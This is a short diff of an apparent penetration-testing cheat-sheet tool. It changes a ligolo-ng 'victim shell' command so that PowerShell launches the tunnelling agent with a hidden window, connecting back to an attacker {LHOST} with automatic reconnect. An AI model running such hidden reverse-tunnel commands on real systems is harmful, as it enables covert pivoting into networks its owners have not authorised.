@@ -756,7 +756,7 @@ EOF
       { cmd: `sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601 -api-laddr 127.0.0.1:8081`, category: 'ligolo-ng' },
       { cmd: ``, category: 'ligolo-ng' },
       { cmd: `# In victim shell`, category: 'ligolo-ng' },
-      { cmd: `./agent.exe -connect {LHOST}:11601 -ignore-cert -retry -reconnect &`, category: 'ligolo-ng' },
+      { cmd: `powershell.exe -c "Start-Process -FilePath '.\\agent.exe' -ArgumentList '-connect {LHOST}:11601 -ignore-cert -retry -reconnect' -WindowStyle Hidden"`, category: 'ligolo-ng' },
       { cmd: `./agent -connect {LHOST}:11601 -ignore-cert -retry -reconnect &`, category: 'ligolo-ng' },
       { cmd: ``, category: 'ligolo-ng' },
       { cmd: `# In ligolo`, category: 'ligolo-ng' },
